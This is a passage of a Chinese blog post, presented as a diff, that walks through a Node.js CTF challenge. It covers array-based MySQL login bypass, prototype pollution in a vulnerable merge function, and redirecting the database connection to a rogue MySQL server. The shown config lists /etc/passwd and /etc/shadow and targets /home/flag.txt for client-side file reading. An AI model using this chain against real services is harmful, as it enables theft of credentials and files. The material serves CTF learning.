@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言最近期末了，因此一直都在复现准备期末考试，最近都没有时间做做题目了，因此最近找了一道题目来看看把学到的东西总结了一下。 0x01 首先要更改nodejs的mysql连接方式。1ALTER USER &amp;apos;root&amp;apos;@&amp;apos;localhost&amp;apos; IDENTIFIED WITH mysql_native_password BY &amp;apos;ljdd520&amp;apos;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道有趣的关于nodejs的ctf题目中学到的东西">
+<meta property="og:url" content="http://yoursite.com/2020/01/06/从一道有趣的关于nodejs的ctf题目中学到的东西/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言最近期末了，因此一直都在复现准备期末考试，最近都没有时间做做题目了，因此最近找了一道题目来看看把学到的东西总结了一下。 0x01 首先要更改nodejs的mysql连接方式。1ALTER USER &amp;apos;root&amp;apos;@&amp;apos;localhost&amp;apos; IDENTIFIED WITH mysql_native_password BY &amp;apos;ljdd520&amp;apos;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_3.PNG">
+<meta property="og:updated_time" content="2020-01-06T07:27:47.560Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从一道有趣的关于nodejs的ctf题目中学到的东西">
+<meta name="twitter:description" content="前言最近期末了，因此一直都在复现准备期末考试，最近都没有时间做做题目了，因此最近找了一道题目来看看把学到的东西总结了一下。 0x01 首先要更改nodejs的mysql连接方式。1ALTER USER &amp;apos;root&amp;apos;@&amp;apos;localhost&amp;apos; IDENTIFIED WITH mysql_native_password BY &amp;apos;ljdd520&amp;apos;">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/06/从一道有趣的关于nodejs的ctf题目中学到的东西/">
+
+
+
+
+
+  <title>从一道有趣的关于nodejs的ctf题目中学到的东西 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/06/从一道有趣的关于nodejs的ctf题目中学到的东西/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从一道有趣的关于nodejs的ctf题目中学到的东西</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-06T15:22:26+08:00">
+                2020-01-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nodejs-web/" itemprop="url" rel="index">
+                    <span itemprop="name">nodejs-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近期末了，因此一直都在复现准备期末考试，最近都没有时间做做题目了，因此最近找了一道题目来看看把学到的东西总结了一下。</p>
+<h5 id="0x01-首先要更改nodejs的mysql连接方式。"><a href="#0x01-首先要更改nodejs的mysql连接方式。" class="headerlink" title="0x01 首先要更改nodejs的mysql连接方式。"></a>0x01 首先要更改nodejs的mysql连接方式。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;ljdd520&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x02-题目的首页如下："><a href="#0x02-题目的首页如下：" class="headerlink" title="0x02 题目的首页如下："></a>0x02 题目的首页如下：</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_1.PNG" alt></p>
+<h5 id="0x03-接下来你会想到什么？"><a href="#0x03-接下来你会想到什么？" class="headerlink" title="0x03 接下来你会想到什么？"></a>0x03 接下来你会想到什么？</h5><h6 id="1-在这里你可能会想到爆破，sql注入等但是都不是。"><a href="#1-在这里你可能会想到爆破，sql注入等但是都不是。" class="headerlink" title="1. 在这里你可能会想到爆破，sql注入等但是都不是。"></a>1. 在这里你可能会想到爆破，sql注入等但是都不是。</h6><h6 id="2-现在你应该看看他的数据包，找找信息，比如这个就是一个Express空架，就是nodejs做后台，那么你会想到什么呢。"><a href="#2-现在你应该看看他的数据包，找找信息，比如这个就是一个Express空架，就是nodejs做后台，那么你会想到什么呢。" class="headerlink" title="2. 现在你应该看看他的数据包，找找信息，比如这个就是一个Express空架，就是nodejs做后台，那么你会想到什么呢。"></a>2. 现在你应该看看他的数据包，找找信息，比如这个就是一个<code>Express</code>空架，就是nodejs做后台，那么你会想到什么呢。</h6><h6 id="3-下面就来介绍一下nodejs作为弱类型的一些特性。"><a href="#3-下面就来介绍一下nodejs作为弱类型的一些特性。" class="headerlink" title="3. 下面就来介绍一下nodejs作为弱类型的一些特性。"></a>3. 下面就来介绍一下nodejs作为弱类型的一些特性。</h6><h6 id="我通过代码调试到达这个函数："><a href="#我通过代码调试到达这个函数：" class="headerlink" title="我通过代码调试到达这个函数："></a>我通过代码调试到达这个函数：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SqlString.arrayToList = <span class="function"><span class="keyword">function</span> <span class="title">arrayToList</span>(<span class="params">array, timeZone</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> val = array[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(val)) &#123;</span><br><span class="line">      sql += (i === <span class="number">0</span> ? <span class="string">''</span> : <span class="string">', '</span>) + <span class="string">'('</span> + SqlString.arrayToList(val, timeZone) + <span class="string">')'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      sql += (i === <span class="number">0</span> ? <span class="string">''</span> : <span class="string">', '</span>) + SqlString.escape(val, <span class="literal">true</span>, timeZone);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sql;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面这个会把传入参数如-0-中的值解析出来val-0。"><a href="#上面这个会把传入参数如-0-中的值解析出来val-0。" class="headerlink" title="上面这个会把传入参数如[0]中的值解析出来val=0。"></a>上面这个会把传入参数如<code>[0]</code>中的值解析出来<code>val=0</code>。</h6><h6 id="紧接着调试的结果如下："><a href="#紧接着调试的结果如下：" class="headerlink" title="紧接着调试的结果如下："></a>紧接着调试的结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_2.PNG" alt></p>
+<h6 id="执行的sql语句如下："><a href="#执行的sql语句如下：" class="headerlink" title="执行的sql语句如下："></a>执行的sql语句如下：</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">user</span>= <span class="number">0</span> <span class="keyword">and</span> passwd=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="最后的结果如下："><a href="#最后的结果如下：" class="headerlink" title="最后的结果如下："></a>最后的结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/nodejs_prototype_pullotion_3.PNG" alt></p>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><a href="https://blog.csdn.net/niexinming/article/details/84889275" target="_blank" rel="noopener">参考链接</a></h6><h6 id="现在我们通过了第一步："><a href="#现在我们通过了第一步：" class="headerlink" title="现在我们通过了第一步："></a>现在我们通过了第一步：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 161</span><br><span class="line">ETag: W/&quot;a1-/vIr3oQBdfpiQE1dF+xyIMGu9Q4&quot;</span><br><span class="line">Date: Tue, 31 Dec 2019 15:27:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;ok&quot;:&quot;congratulations&quot;,&quot;msg&quot;:&quot;pls look \\kfhkhkdsdshalkhkhaklhlahlkkhdfklhhjkhgdajgfhjaghghjasgfjh\\jflkdsajklfjsakljfjkhkjhdsfgasdyuuyueuwguguiuidgffddjfj.js&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x04-现在我们拿到了后端的代码如下："><a href="#0x04-现在我们拿到了后端的代码如下：" class="headerlink" title="0x04 现在我们拿到了后端的代码如下："></a>0x04 现在我们拿到了后端的代码如下：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>( <span class="string">'mysql'</span> );</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>( config ) &#123;</span><br><span class="line">    <span class="keyword">this</span>.connection = mysql.createConnection( config );</span><br><span class="line">  &#125;</span><br><span class="line">  query( sql, args ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function">(<span class="params"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.connection.query( sql, args, ( err, rows ) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> ( err )</span><br><span class="line">          <span class="keyword">return</span> reject( err );</span><br><span class="line">        resolve( rows );</span><br><span class="line">      &#125; );</span><br><span class="line">    &#125; );</span><br><span class="line">  &#125;</span><br><span class="line">  close() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function">(<span class="params"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.connection.end( <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( err )</span><br><span class="line">          <span class="keyword">return</span> reject(err);</span><br><span class="line">        resolve();</span><br><span class="line">      &#125; );</span><br><span class="line">    &#125; );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res,next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"index"</span>);</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123;<span class="attr">title</span>: <span class="string">'HTML'</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">    <span class="keyword">if</span> (body.host !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      res.json(&#123;</span><br><span class="line">        <span class="string">"error"</span>: <span class="string">"error"</span>,<span class="string">"msg"</span>:<span class="string">"no !! !!"</span></span><br><span class="line">      &#125;);</span><br><span class="line">      process.exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> copybody = clone(body);</span><br><span class="line">    <span class="keyword">const</span> host = copybody.host === <span class="literal">undefined</span> ? <span class="string">"localhost"</span> : copybody.host;</span><br><span class="line">    <span class="keyword">const</span> config = &#123;</span><br><span class="line">        host: host,</span><br><span class="line">        user: <span class="string">'root'</span>,</span><br><span class="line">        password: <span class="string">'aaadfsafsdafadsaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>,</span><br><span class="line">        database: <span class="string">'tdafsffaft'</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> database=<span class="keyword">new</span> Database(config);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> someRows, otherRows;</span><br><span class="line">  database.query( <span class="string">'select * from user where user= ? and passwd =?'</span>, [copybody.user,copybody.passwd] )</span><br><span class="line">      .then( <span class="function"><span class="params">rows</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'The solution is: '</span>, rows[<span class="number">0</span>].user);</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">1</span> === rows[<span class="number">0</span>].id) &#123;</span><br><span class="line">              res.json(&#123;</span><br><span class="line">                  <span class="string">"ok"</span>: <span class="string">"congratulations"</span>,<span class="string">"msg"</span>:<span class="string">"pls look //kfhkhkdsdshalkhkhaklhlahlkkhdfklhhjkhgdajgfhjaghghjasgfjh//jflkdsajklfjsakljfjkhkjhdsfgasdyuuyueuwguguiuidgffddjfj.js"</span></span><br><span class="line">              &#125;)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              res.json(&#123;</span><br><span class="line">                  <span class="string">"error"</span>: <span class="string">"cookie not set"</span>,<span class="string">"msg"</span>:<span class="string">"1111111111"</span></span><br><span class="line">              &#125;) </span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .then( <span class="function"><span class="params">rows</span> =&gt;</span> &#123;</span><br><span class="line">          otherRows = rows;</span><br><span class="line">          <span class="keyword">return</span> database.close();</span><br><span class="line">          &#125;,err =&gt; &#123;</span><br><span class="line">          <span class="keyword">return</span> database.close().then( <span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="keyword">throw</span> err; &#125; )</span><br><span class="line">      &#125;)</span><br><span class="line">      .then( <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          res.json(&#123;</span><br><span class="line">              <span class="string">"error"</span>: <span class="string">"err"</span>,<span class="string">"msg"</span>:<span class="string">"user or pass err"</span></span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch( <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">          res.json(&#123;</span><br><span class="line">              <span class="string">"error"</span>: <span class="string">"err"</span>,<span class="string">"msg"</span>:<span class="string">"user or pass err"</span></span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* flag in /home/flag.txt */</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下："><a href="#我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下：" class="headerlink" title="我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下："></a>我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下：</h6><h6 id="https-blog-csdn-net-ls1120704214-article-details-88174003"><a href="#https-blog-csdn-net-ls1120704214-article-details-88174003" class="headerlink" title="https://blog.csdn.net/ls1120704214/article/details/88174003"></a><a href="https://blog.csdn.net/ls1120704214/article/details/88174003" target="_blank" rel="noopener">https://blog.csdn.net/ls1120704214/article/details/88174003</a></h6><h6 id="如果直接在json中传递-quot-host-quot-quot-quot-，不会有任何的作用，因为有过滤。"><a href="#如果直接在json中传递-quot-host-quot-quot-quot-，不会有任何的作用，因为有过滤。" class="headerlink" title="如果直接在json中传递{&quot;host&quot;:&quot;&quot;}，不会有任何的作用，因为有过滤。"></a>如果直接在json中传递<code>{&quot;host&quot;:&quot;&quot;}</code>，不会有任何的作用，因为有过滤。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (body.host !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      res.json(&#123;</span><br><span class="line">        <span class="string">"error"</span>: <span class="string">"error"</span>,<span class="string">"msg"</span>:<span class="string">"no !! !!"</span></span><br><span class="line">      &#125;);</span><br><span class="line">      process.exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章："><a href="#如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章：" class="headerlink" title="如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章："></a>如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章：</h6><h6 id="https-www-4hou-com-technology-16328-html"><a href="#https-www-4hou-com-technology-16328-html" class="headerlink" title="https://www.4hou.com/technology/16328.html"></a><a href="https://www.4hou.com/technology/16328.html" target="_blank" rel="noopener">https://www.4hou.com/technology/16328.html</a></h6><h6 id="所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址"><a href="#所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址" class="headerlink" title="所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址"></a>所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址</h6><h6 id="首先，我要先把我服务器中的Rogue-mysql-Server的rogue-mysql-server-py中的filelist改成flag的地址"><a href="#首先，我要先把我服务器中的Rogue-mysql-Server的rogue-mysql-server-py中的filelist改成flag的地址" class="headerlink" title="首先，我要先把我服务器中的Rogue-mysql-Server的rogue_mysql_server.py中的filelist改成flag的地址"></a>首先，我要先把我服务器中的<code>Rogue-mysql-Server</code>的<code>rogue_mysql_server.py</code>中的<code>filelist</code>改成<code>flag</code>的地址</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filelist = (</span><br><span class="line">#    r&apos;c:\boot.ini&apos;,</span><br><span class="line">#    r&apos;c:\windows\win.ini&apos;,</span><br><span class="line">#    r&apos;c:\windows\system32\drivers\etc\hosts&apos;,</span><br><span class="line">#    &apos;/etc/passwd&apos;,</span><br><span class="line">#    &apos;/etc/shadow&apos;,</span><br><span class="line">    &apos;/home/flag.txt&apos;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
